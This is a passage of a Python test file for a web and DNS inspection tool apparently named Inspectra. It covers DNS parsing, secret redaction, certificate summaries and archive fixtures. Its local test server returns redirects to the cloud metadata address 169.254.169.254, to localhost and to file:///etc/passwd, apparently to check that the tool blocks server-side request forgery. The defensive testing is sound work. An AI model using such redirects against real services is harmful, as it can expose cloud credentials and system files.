        make_dns_response(runner.DNS_RECORD_TYPES["AAAA"], bytes.fromhex("20010db8000000000000000000000001")),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["AAAA"],
    )
    mx_records, _ = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["MX"], struct.pack("!H", 10) + dns_name("mail.example.com")),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["MX"],
    )
    caa_records, _ = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["CAA"], b"\x00\x05issueletsencrypt.org"),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["CAA"],
    )
    soa_records, _ = runner.parse_dns_response(
        make_dns_response(
            runner.DNS_RECORD_TYPES["SOA"],
            dns_name("ns1.example.com") + dns_name("hostmaster.example.com") + struct.pack("!IIIII", 1, 3600, 600, 86400, 300),
        ),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["SOA"],
    )

    assert a_records == ["93.184.216.34"]
    assert a_truncated is False
    assert aaaa_records == ["2001:db8::1"]
    assert mx_records == [{"preference": 10, "exchange": "mail.example.com"}]
    assert caa_records == [{"flags": 0, "tag": "issue", "value": "letsencrypt.org"}]
    assert soa_records == [
        {
            "mname": "ns1.example.com",
            "rname": "hostmaster.example.com",
            "serial": 1,
            "refresh": 3600,
            "retry": 600,
            "expire": 86400,
            "minimum": 300,
        }
    ]


def test_parse_dns_response_handles_txt_chunks_redaction_and_truncation():
    txt_records, _ = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["TXT"], dns_txt_chunks(["hello ", "token=supersecret", " end"])),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["TXT"],
    )
    long_txt_records, _ = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["TXT"], dns_txt_chunks(["a" * 255, "b" * 255, "c" * 255])),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["TXT"],
    )

    assert txt_records == ["hello token=[redacted] end"]
    assert "supersecret" not in txt_records[0]
    assert len(long_txt_records[0]) <= runner.DNS_MAX_STRING_LENGTH
    assert long_txt_records[0].endswith("...[truncated]")


def test_parse_dns_response_handles_compression_truncation_and_rcodes():
    cname_records, _ = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["CNAME"], b"\xc0\x0c"),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["CNAME"],
    )
    nx_records, nx_truncated = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["A"], None, flags=0x8183),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["A"],
    )
    _, truncated = runner.parse_dns_response(
        make_dns_response(runner.DNS_RECORD_TYPES["A"], bytes([93, 184, 216, 34]), flags=0x8380),
        DNS_TEST_QUERY_ID,
        runner.DNS_RECORD_TYPES["A"],
    )

    assert cname_records == ["example.com"]
    assert nx_records == []
    assert nx_truncated is False
    assert truncated is True
    with pytest.raises(ValueError, match="DNS response code 2"):
        runner.parse_dns_response(make_dns_response(runner.DNS_RECORD_TYPES["A"], None, flags=0x8182), DNS_TEST_QUERY_ID, runner.DNS_RECORD_TYPES["A"])


def test_parse_dns_response_rejects_malformed_packets():
    question = dns_name("example.com") + struct.pack("!HH", runner.DNS_RECORD_TYPES["A"], 1)
    answer = b"\xc0\x0c" + struct.pack("!HHIH", runner.DNS_RECORD_TYPES["A"], 1, 60, 4) + b"\x01\x02"
    malformed = struct.pack("!HHHHHH", DNS_TEST_QUERY_ID, 0x8180, 1, 1, 0, 0) + question + answer

    with pytest.raises(ValueError, match="too short"):
        runner.parse_dns_response(b"\x00", DNS_TEST_QUERY_ID, runner.DNS_RECORD_TYPES["A"])
    with pytest.raises(ValueError, match="rdata exceeds"):
        runner.parse_dns_response(malformed, DNS_TEST_QUERY_ID, runner.DNS_RECORD_TYPES["A"])


DNS_TEST_QUERY_ID = 0xBEEF


def dns_name(name: str) -> bytes:
    return b"".join(bytes([len(label)]) + label.encode("ascii") for label in name.rstrip(".").split(".")) + b"\x00"


def dns_txt_chunks(chunks: list[str]) -> bytes:
    return b"".join(bytes([len(chunk.encode("utf-8"))]) + chunk.encode("utf-8") for chunk in chunks)


def make_dns_response(qtype: int, rdata: bytes | None, *, flags: int = 0x8180) -> bytes:
    question = dns_name("example.com") + struct.pack("!HH", qtype, 1)
    answer = b""
    if rdata is not None:
        answer = b"\xc0\x0c" + struct.pack("!HHIH", qtype, 1, 60, len(rdata)) + rdata
    return struct.pack("!HHHHHH", DNS_TEST_QUERY_ID, flags, 1, 1 if rdata is not None else 0, 0, 0) + question + answer


def test_web_tls_certificate_summary_parses_dates():
    cert = {
        "subject": ((("commonName", "example.test"),),),
        "issuer": ((("organizationName", "Inspectra Test CA"),),),
        "notBefore": "May  1 00:00:00 2026 GMT",
        "notAfter": "Jun  1 00:00:00 2026 GMT",
        "subjectAltName": (("DNS", "example.test"),),
    }

    summary = runner.summarize_certificate(cert)

    assert summary["subject"]["commonName"] == "example.test"
    assert summary["issuer"]["organizationName"] == "Inspectra Test CA"
    assert summary["not_before"].startswith("2026-05-01")
    assert summary["not_after"].startswith("2026-06-01")
    assert summary["subject_alt_names"] == ["example.test"]


def write_manifest(tmp_path, filename: str, content: str):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    manifest_path = uploads_dir / filename
    manifest_path.write_text(content, encoding="utf-8")
    return manifest_path


class LocalWebHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/redirect":
            self.send_response(302)
            self.send_header("Location", "/final")
            self.end_headers()
            return
        if self.path == "/redirect-query":
            self.send_response(302)
            self.send_header("Location", "/final?token=supersecret&page=1")
            self.end_headers()
            return
        if self.path == "/loop":
            self.send_response(302)
            self.send_header("Location", "/loop2")
            self.end_headers()
            return
        if self.path == "/loop2":
            self.send_response(302)
            self.send_header("Location", "/loop")
            self.end_headers()
            return
        if self.path == "/redirect-private":
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
            self.end_headers()
            return
        if self.path == "/redirect-localhost":
            self.send_response(302)
            self.send_header("Location", "http://localhost/")
            self.end_headers()
            return
        if self.path == "/redirect-file":
            self.send_response(302)
            self.send_header("Location", "file:///etc/passwd")
            self.end_headers()
            return
        if self.path == "/redirect-port":
            self.send_response(302)
            self.send_header("Location", "https://example.test:8443/")
            self.end_headers()
            return
        if self.path == "/robots.txt":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"User-agent: *\nDisallow: /admin\nSitemap: /sitemap.xml\n")
            return
        if self.path == "/.well-known/security.txt":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Contact: mailto:security@example.test\nExpires: 2027-01-01T00:00:00Z\n")
            return
        if self.path == "/security.txt":
            self.send_response(404)
            self.end_headers()
            return
        if self.path == "/large":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"x" * 128)
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Server", "InspectraTest")
        self.send_header("Set-Cookie", "sid=supersecret; HttpOnly; SameSite=Lax; Path=/")
        self.end_headers()
        self.wfile.write(b"<html><title>Inspectra</title></html>")

    def log_message(self, format, *args):
        return


def start_test_http_server():
    server = ThreadingHTTPServer(("127.0.0.1", 0), LocalWebHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def write_zip_archive(tmp_path, entries: dict[str, bytes]):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        for name, content in entries.items():
            archive.writestr(name, content)
    return archive_path


def write_tar_archive(tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        content = b"hello\n"
        file_info = tarfile.TarInfo("README.md")
        file_info.size = len(content)
        file_info.mode = 0o644
        archive.addfile(file_info, io.BytesIO(content))

        link_info = tarfile.TarInfo("latest-readme")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "README.md"
        link_info.mode = 0o777
        archive.addfile(link_info)
    return archive_path


def write_tar_many_entries(tmp_path, count: int):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        for index in range(count):
            content = b"x\n"
            file_info = tarfile.TarInfo(f"files/{index}.txt")
            file_info.size = len(content)
            file_info.mode = 0o644
            archive.addfile(file_info, io.BytesIO(content))
    return archive_path


def write_tar_manifest_archive(tmp_path, filename: str, content: bytes):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        file_info = tarfile.TarInfo(filename)
        file_info.size = len(content)
        file_info.mode = 0o644
        archive.addfile(file_info, io.BytesIO(content))
    return archive_path


def fake_image_command(args: list[str]) -> dict:
    stdout = ""
    if args[0] == "file" and "--mime-type" in args:
        stdout = "image/png\n"
    elif args[0] == "file":
        stdout = "PNG image data, 1 x 1, 8-bit/color RGB\n"
    elif args[0] == "exiftool":
        stdout = '[{"ImageWidth":1,"ImageHeight":1,"MIMEType":"image/png","GPSLatitude":40.0,"Software":"unit-test"}]'

    return {
        "command": args[0],
        "args": args[1:-1],
        "exit_code": 0,
        "duration_ms": 1.0,
        "stdout": stdout,
        "stderr": "",
        "timed_out": False,
        "timeout_seconds": runner.COMMAND_TIMEOUT_SECONDS,
    }
